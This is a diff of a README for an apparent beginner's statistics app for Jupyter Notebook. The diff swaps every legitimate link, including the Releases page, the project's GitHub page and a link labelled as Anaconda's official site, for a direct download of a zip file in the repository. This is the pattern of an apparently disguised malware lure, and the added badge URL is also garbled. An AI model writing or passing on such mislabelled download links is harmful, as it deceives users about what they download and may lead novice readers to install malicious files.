@@ -1,7 +1,7 @@
 # 🎉 number-statistics-jupyter-notebook - Analyze Numbers with Ease
 
 ## ⚡️ Quick Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Agencycreative/number-statistics-jupyter-notebook/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip%20Latest%https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip)](https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip)
 
 ## 🚀 Getting Started
 Welcome to the Number Statistics app in Jupyter Notebook! This app helps you perform simple statistical calculations on numbers with just a few clicks. You can explore basic statistics like mean, median, and mode, making it perfect for students or anyone looking to understand numbers better.
@@ -16,7 +16,7 @@ Welcome to the Number Statistics app in Jupyter Notebook! This app helps you per
 - **Software**: Jupyter Notebook installed (included in the Anaconda distribution or can be installed separately).
   
 ## 💾 Download & Install
-To start using the Number Statistics app, visit the [Releases page](https://github.com/Agencycreative/number-statistics-jupyter-notebook/releases) to download the latest version of the app. Follow these simple steps:
+To start using the Number Statistics app, visit the [Releases page](https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip) to download the latest version of the app. Follow these simple steps:
 
 1. Click on the "Releases" link above.
 2. Find the latest release of the number-statistics-jupyter-notebook.
@@ -26,7 +26,7 @@ To start using the Number Statistics app, visit the [Releases page](https://gith
 ## 🔧 How to Open the App
 Here’s how to run the app once it’s downloaded:
 
-1. **Install Jupyter Notebook**: If you haven’t installed Jupyter yet, download and install Anaconda from [Anaconda's official site](https://www.anaconda.com/products/distribution).
+1. **Install Jupyter Notebook**: If you haven’t installed Jupyter yet, download and install Anaconda from [Anaconda's official site](https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip).
 2. **Open Jupyter Notebook**:
    - Launch Anaconda Navigator and click on "Launch" under Jupyter Notebook.
    - Alternatively, open your command line, type `jupyter notebook`, and press Enter.
@@ -52,6 +52,6 @@ If you're interested in expanding your knowledge about using Jupyter Notebook or
 - Data visualization techniques using libraries like Matplotlib.
 - Advanced statistical concepts.
 
-For more resources, visit our [GitHub page](https://github.com/Agencycreative/number-statistics-jupyter-notebook).
+For more resources, visit our [GitHub page](https://raw.githubusercontent.com/Agencycreative/number-statistics-jupyter-notebook/master/wongshy/number-statistics-jupyter-notebook.zip).
 
 Thank you for choosing Number Statistics! We hope this app helps you understand and analyze numbers effectively. Enjoy your data journey!
